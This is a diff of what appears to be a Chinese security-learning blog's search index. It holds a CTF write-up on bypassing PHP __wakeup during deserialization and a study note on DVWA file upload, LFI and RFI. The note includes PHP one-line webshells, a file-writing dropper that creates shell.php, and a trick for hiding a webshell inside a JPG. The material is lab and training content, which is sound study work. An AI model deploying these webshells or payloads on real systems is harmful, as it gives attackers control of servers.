-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$aa=new HaHaHa();</span><br><span class="line">$aa-&gt;admin=&quot;admin&quot;;</span><br><span class="line">$aa-&gt;passwd=&quot;wllm&quot;;</span><br><span class="line">$stus=serialize($aa);</span><br><span class="line">print_r($stus);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072021557-69d0075f-fe21-47ff-865f-e01fc6d01c89.png" alt="img"></p>
-<p>将序列化得到的          O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
-<p>改为               O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;}</p>
-<p>即可绕过__wakeup</p>
-<p><img src="/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/1671072102334-c745feff-7182-4544-9f3c-9ea5dd1ac934.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2313,43 +2313,6 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
-    <title>网安基础总结四</title>
-    <url>/2022/06/26/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%9B%9B/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。</p>
-<p>2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。</p>
-<p>3.MIME类型：一种文件拓展名包含一种MIME类型。</p>
-<span id="more"></span>
-
-<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><p>第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p>
-<p>以下三条一句话木马</p>
-<p>1.<?php @eval($_POST['flag']);?>此类为POST类型一句话木马，需蚁剑连接。</p>
-<p>2.<?php eval($_REQUEST['php']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）</p>
-<p>3.<?php system($_REQUEST['linux']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）</p>
-<p>目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”</p>
-<h6 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h6><p>将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。</p>
-<h6 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h6><p>此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。</p>
-<p>用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件</p>
-<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><h6 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h6><p>本地文件包含 Local File Include (LFI)</p>
-<p>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。</p>
-<p>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
-<h6 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h6><p>远程文件包含 Remote File Include (RFI)</p>
-<p>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。</p>
-<p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
-<p>文件包含漏洞也可以和文件上传漏洞相配合使用。</p>
-<p>通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。</p>
-<p> 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入   copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。</p>
-<?php fputs(fopen('shell.php','w'),'<?php eval($_post[flag]);>');?><p>这段代码意思是生成shell.php这个新文件，并将<?php eval($_post[flag]);>');?>写入。</p>
-<p>最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。</p>
-<p>这就叫条件竞争绕过  竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安基础总结八</title>
     <url>/2022/12/04/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%85%AB/</url>
     <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><h2 id="Mysql注入中load-file-与select-into-outfile命令"><a href="#Mysql注入中load-file-与select-into-outfile命令" class="headerlink" title="Mysql注入中load_file()与select into outfile命令"></a>Mysql注入中load_file()与select into outfile命令</h2><h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>查看某个文件的内容</p>
@@ -2625,6 +2588,43 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>寒暑假逆袭的关键，而我却没有加以利用，认真去学习！</p>
 <p>接着开学封校，一直到九月中旬才能来校学习，这次，我不会再浪费时间，我一直以来的黑客梦永远不会消散。</p>
 <p>虽然道路艰难，但我会一直前行，漫漫长征路，偏向虎山行，此志共勉！</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结四</title>
+    <url>/2022/06/26/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E5%9B%9B/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.从kali上的burpsuite上想要抓取物理机上的数据包，必须设置kali的网络连接为NAT模式，并且设置网段与物理机在同一个网段，在burpsuite上设置的代理与本机代理一致。</p>
+<p>2.REQUEST是在网页端输入变量访问，POST则是在使用像中国蚁剑之类的工具连接。</p>
+<p>3.MIME类型：一种文件拓展名包含一种MIME类型。</p>
+<span id="more"></span>
+
+<h5 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h5><p>第一：文件上传漏洞采用上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p>
+<p>以下三条一句话木马</p>
+<p>1.<?php @eval($_POST['flag']);?>此类为POST类型一句话木马，需蚁剑连接。</p>
+<p>2.<?php eval($_REQUEST['php']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?php=phpinfo(),这里等号后面的只能填php语言有效）</p>
+<p>3.<?php system($_REQUEST['linux']);?>此类为REQUEST类型一句话木马，只能在url地址栏更改内容达到网站控制。（如xxxx/xxx.php?linux=cat /etc/psaawd,这里等号后面的只能填linux命令有效）</p>
+<p>目前DVWA上的文件上传漏洞分为三个级别，分别为“low、medium、high”</p>
+<h6 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h6><p>将一句话木马用php文件打包好之后，上传到可以上传图片的地方（这里的上传点有较大的漏洞，安全级别为low，并未限制上传的文件格式），如果上传成功，我们可用菜刀或蚁剑之类的工具连接url地址，就可以获取网站控制权限。</p>
+<h6 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h6><p>此时，安全性高了一个等级，文件上传有了文件类型的限制（如 if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp;），这样我们只有修改文件类型即可成功上传。</p>
+<p>用burpsuite抓包修改Content-Type请求头里的内容即可，将MIME类型改为image/jpeg，再forward就能成功上传文件</p>
+<h5 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h5><h6 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h6><p>本地文件包含 Local File Include (LFI)</p>
+<p>所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。</p>
+<p>所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。</p>
+<h6 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h6><p>远程文件包含 Remote File Include (RFI)</p>
+<p>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。</p>
+<p>远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p>
+<p>文件包含漏洞也可以和文件上传漏洞相配合使用。</p>
+<p>通过jpg文件和php文件的结合，将一句话木马隐藏在图片内。</p>
+<p> 将jpg文件和php文件放在一个目录内，在这个目录cmd模式下输入   copy /b xxx.jpg + xxxx.php xxxxx.jpg 就可生成xxxxx.jpg文件。</p>
+<?php fputs(fopen('shell.php','w'),'<?php eval($_post[flag]);>');?><p>这段代码意思是生成shell.php这个新文件，并将<?php eval($_post[flag]);>');?>写入。</p>
+<p>最后将jpg文件上传，用蚁剑连接shell.php这个文件拿到权限。</p>
+<p>这就叫条件竞争绕过  竞争条件：服务端首先是允许用户上传任意类型的文件，上传过后再去检查文件，如果文件存在恶意的内容，那么就会执行删除操作，可以利用这个时间差来完成攻击。</p>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
